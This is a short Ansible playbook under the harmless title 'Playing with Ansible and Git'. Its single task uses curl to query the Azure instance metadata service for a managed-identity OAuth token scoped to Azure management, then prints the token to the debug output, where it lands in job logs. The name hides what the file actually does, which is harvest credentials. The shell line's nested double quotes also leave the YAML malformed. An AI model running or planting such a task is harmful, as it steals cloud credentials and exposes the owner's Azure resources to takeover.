---
  - name: "Playing with Ansible and Git"
    hosts: localhost
    connection: local 
    gather_facts: false
    
    tasks:

    - name: "Execute a command"
      shell: "curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F" -s"
      register: "output"

    - debug: var=output.stdout_lines
